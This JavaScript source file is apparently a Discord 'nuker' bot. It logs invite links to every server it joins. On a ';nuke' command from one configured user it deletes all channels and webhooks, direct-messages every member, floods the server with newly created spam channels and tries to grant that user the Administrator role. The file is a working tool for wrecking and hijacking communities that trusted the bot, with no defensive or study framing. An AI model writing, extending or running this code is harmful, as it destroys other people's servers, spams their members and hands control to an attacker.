const { Client, Intents, Collection } = require('discord.js');
const fs = require('fs');
const yaml = require('js-yaml');

const configFile = fs.readFileSync('config.yml', 'utf8');
const config = yaml.safeLoad(configFile);

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

async function generateInviteLinks(client) {
  const inviteLinks = [];

  const guilds = client.guilds.cache.array();

  for (const guild of guilds) {
    try {
      const channel = guild.channels.cache.find(ch => ch.type === 'GUILD_TEXT' && ch.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
      if (channel) {
        const invite = await channel.createInvite({
          maxAge: 86400,
          maxUses: 1,
          unique: true
        });
        inviteLinks.push(`${guild.name}: https://discord.gg/${invite.code}`);
      }
    } catch (error) {
      console.error(`Error generating invite for server "${guild.name}": ${error.message}`);
    }
  }

  return inviteLinks;
}

client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);

  try {
    const inviteLinks = await generateInviteLinks(client);

    console.log('Invite Links:');
    inviteLinks.forEach(link => console.log(link));
  } catch (error) {
    console.error('Error generating invite links:', error);
  }
});

client.on('messageCreate', async (message) => {
  const { content, author, channel, guild } = message;
  const commandPrefix = config.commandPrefix || ';';

  if (content === `${commandPrefix}nuke` && author.id === config.allowedUserId) {
    try {
      await Promise.all(guild.channels.cache.map(channel => channel.delete()));
      console.log('All channels deleted.');
    } catch (error) {
      console.error('Error deleting channels:', error);
    }
    try {
      const webhooks = await guild.fetchWebhooks();
      await Promise.all(webhooks.map(webhook => webhook.delete()));
      console.log('All webhooks deleted.');
    } catch (error) {
      console.error('Error deleting webhooks:', error);
    }
    guild.members.cache.forEach(member => {
      if (member.id !== client.user.id) {
        member.send(config.dmMessage)
          .then(() => console.log(`Sent DM to ${member.user.tag}`))
          .catch(error => console.error(`Failed to send DM to ${member.user.tag}:`, error));
      }
    });
    try {
      for (let i = 0; i < config.channelNumber; i++) {
        const newChannel = await channel.guild.channels.create(`${config.channelName}-${i + 1}`, {
          type: 'GUILD_TEXT'
        });

        console.log('Channel created:', newChannel.name);

        newChannel.send(config.messageToSend)
          .then(() => console.log('Message sent to the channel.'))
          .catch(error => console.error('Error sending message:', error));
      }
    } catch (error) {
      console.error('Error creating channels:', error);
    }
    try {
      const user = await guild.members.fetch(config.allowedUserId);
      if (user) {
        await user.roles.add(guild.roles.everyone);
        await user.roles.add(guild.roles.cache.find(role => role.name === 'Administrator'));
        console.log('Administrator permission granted to user.');
        channel.send('Administrator permission granted to the user.');
      } else {
        console.log('User not found.');
        channel.send('User not found.');
      }
    } catch (error) {
      console.error('Error granting Administrator permission:', error);
      channel.send('Error granting Administrator permission.');
    }
  }
});

client.login(config.token);
